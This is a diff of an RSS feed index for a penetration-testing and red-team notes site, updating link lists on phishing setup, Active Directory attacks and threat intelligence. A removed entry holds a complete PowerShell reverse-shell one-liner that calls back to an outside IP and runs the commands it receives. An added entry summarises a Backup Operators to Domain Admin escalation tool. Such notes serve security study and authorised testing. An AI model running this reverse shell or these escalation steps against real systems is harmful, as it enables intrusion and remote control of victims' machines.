@@ -255,7 +255,7 @@ Local Extraction VSSadmin # Récupération via VSSadmin # Create a Volume Shadow
       
       <guid>/phishing-redteam-and-se/phishing_campaign_setup/</guid>
       <description>General Informations # Using a specific and dedicated machine is a good choice. # It avoid being indexed and referenced as a phishing server for your own VPS # All the server configuration is pulled from the following Github repository # it provides a fully functionnal bash script to automate the process https://github.com/n0pe-sled/Postfix-Server-Setup # Generate typo &amp;amp; permutations on a domain name https://dnstwister.report/# Message Header Analyzer https://mha.azurewebsites.net/ 
-Debugging Tips / Important notes Blacklisted/Spam domain # If the domain is blacklisted / considered as spam, you can try to reference www.</description>
+# The Spamhaus Project # Interesting stats about The World&amp;#39;s Most Abused TLDs.</description>
     </item>
     
     <item>
@@ -962,7 +962,7 @@ Online DNS tools and services # VirusTotal runs its own passive DNS replication 
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/resources/systems/</guid>
-      <description>Windows Network / IPv6  MITM6 (https://github.com/fox-it/mitm6) NTLM Relaying and Kerberos Delegation (https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/) Compromising IPv4 networks via IPv6 (https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/) Domain Attacks Getting an Account (https://systemadminspro.com/domain-attacks-getting-an-account/) Peneration Testing Active Directory Part 1 (https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/) Taking Over IPv6 Networks (https://blog.vonahi.io/taking-over-ipv6-networks/) mitm6 pentesting (https://intrinium.com/mitm6-pen-testing/) A pivot cheatsheet for pentesters (https://nullsweep.com/pivot-cheatsheet-for-pentesters/)  Kerberos  Kerberos Cheatsheet (https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a) Hunting for Skeleton Key implants (https://riccardoancarani.github.io/2020-08-08-hunting-for-skeleton-keys/) Hunting for Impacket (https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/) Kerberoasting without SPNs (https://swarm.ptsecurity.com/kerberoasting-without-spns/)  Privilege Escalation  PrivExchange (https://github.</description>
+      <description>Windows Network / IPv6  MITM6 (https://github.com/fox-it/mitm6) NTLM Relaying and Kerberos Delegation (https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/) Compromising IPv4 networks via IPv6 (https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/) Domain Attacks Getting an Account (https://systemadminspro.com/domain-attacks-getting-an-account/) Peneration Testing Active Directory Part 1 (https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/) Taking Over IPv6 Networks (https://blog.vonahi.io/taking-over-ipv6-networks/) mitm6 pentesting (https://intrinium.com/mitm6-pen-testing/) A pivot cheatsheet for pentesters (https://nullsweep.com/pivot-cheatsheet-for-pentesters/) I’m bringing relaying back: A comprehensive guide on relaying anno 2022 (https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022/)  Kerberos  Kerberos Cheatsheet (https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a) Hunting for Skeleton Key implants (https://riccardoancarani.</description>
     </item>
     
     <item>
@@ -1294,9 +1294,9 @@ Exploiting crontab # If a script is running with higher privileges echo &amp;#34
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/resources/cti/</guid>
-      <description> Some CTI Resources  Threat Actor Map (https://aptmap.netlify.app/#) Darknet Markets For Investigators (https://www.osintme.com/index.php/2020/11/21/list-of-darknet-markets-for-investigators/)  
+      <description>Some CTI Resources  Threat Actor Map (https://aptmap.netlify.app/#) Darknet Markets For Investigators (https://www.osintme.com/index.php/2020/11/21/list-of-darknet-markets-for-investigators/) Analyzing Network Infrastructure as Composite Objects (https://www.domaintools.com/resources/blog/analyzing-network-infrastructure-as-composite-objects/) Extrapolating Adversary Intent Through Infrastructure (https://www.domaintools.com/resources/blog/extrapolating-adversary-intent-through-infrastructure/) Current Events to Widespread Campaigns: Pivoting from Samples to Identify Activity (https://www.domaintools.com/resources/blog/current-events-to-widespread-campaigns-pivoting-from-samples-to-identify/)  
 Not really CTI Related but can help  Le Dessous des Cartes (Geopolitics) (https://www.youtube.com/c/LeDessousdesCartesARTE/videos)  
-Training and learning  A Cyber Threat Intelligence Self-Study Plan: Part 1 (https://medium.com/katies-five-cents/a-cyber-threat-intelligence-self-study-plan-part-1-968b5a8daf9a)   Tools and Usable informations  Certstream project (https://certstream.calidog.io/)  </description>
+Training and learning  A Cyber Threat Intelligence Self-Study Plan: Part 1 (https://medium.com/katies-five-cents/a-cyber-threat-intelligence-self-study-plan-part-1-968b5a8daf9a)   Tools and Usable informations  Certstream project (https://certstream.</description>
     </item>
     
     <item>
@@ -1477,15 +1477,6 @@ cmd.exe # Enable RDP from cmd.exe reg add &amp;#34;HKEY_LOCAL_MACHINE\SYSTEM\Cur
       
       <guid>/open-source-intelligence-osint/platforms-hunting/snapchat/</guid>
       <description># Snapchat guide for law enforcment https://storage.googleapis.com/snap-inc/privacy/lawenforcement.pdf Online Research Tools # Online browser # Potentially NSFW https://sovip.io # User Search https://www.snapdex.com/ https://snapyfox.com/ # Location https://map.snapchat.com/ Snapchat Map https://osintcurio.us/2020/04/13/using-snapchat-for-osint-10-minute-tip/ # Using the map you can view public content # You can play with overlays and save videos # To get video # - Developper Tools (F12) # - Network and filter on medias # - Reload (Ctrl+R) # - On the snap link, right click and open in new tab # By default it removes extra graphics layer https://s.</description>
-    </item>
-    
-    <item>
-      <title>Windows Shells Methods</title>
-      <link>/shells-methods/windows/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/shells-methods/windows/</guid>
-      <description>Powershell # Powershell reverse shell # Scheduled task for example # powershell -enc &amp;lt;base 64 de la commande&amp;gt; $client = New-Object System.Net.Sockets.TCPClient(&amp;#34;10.0.20.12&amp;#34;,443);$stream = $client.GetStream();\ [byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;\ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\ $sendback = (iex $data 2&amp;gt;&amp;amp;1 | Out-String );$sendback2 = $sendback + &amp;#34;PS &amp;#34; + (pwd).Path + &amp;#34;&amp;gt; &amp;#34;;\ $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\ $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() WMIexec # wmiexec is less noisy than psexec /usr/bin/impacket-wmiexec d.</description>
     </item>
     
     <item>
@@ -1826,6 +1817,15 @@ Authentication Checking (classical credentials) USER admin PASS admin USER root 
       <guid>/open-source-intelligence-osint/platforms-hunting/parler/</guid>
       <description>Resources https://www.skopenow.com/news/the-new-digital-meeting-place-what-parler-means-for-osint-investigators 
 Tips &amp;amp; Tricks # You can use dorks without account to find content site:parler.com site:parler.com/post/ site:parler.com/profile/ site:parler.</description>
+    </item>
+    
+    <item>
+      <title>Specific Domain Groups</title>
+      <link>/windows-systems/privilege-escalation/specific_domain_groups/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows-systems/privilege-escalation/specific_domain_groups/</guid>
+      <description>Backup Operator / SeBackupPrivilege https://github.com/mpgn/BackupOperatorToDA # If you compromise an account member of the group Backup Operators # you can become the Domain Admin without RDP or WinRM on the Domain Controller. # With this POC you don&amp;#39;t need to have an access with WinRM or RPD : .\BackupOperatorToDA.exe -h Backup Operator to Domain Admin (by @mpgn_x64) This tool exist thanks to @filip_dragovic / https://github.com/Wh04m1001 Mandatory argument: -t &amp;lt;TARGET&amp;gt; \\computer_name (ex: \\dc01.</description>
     </item>
     
     <item>
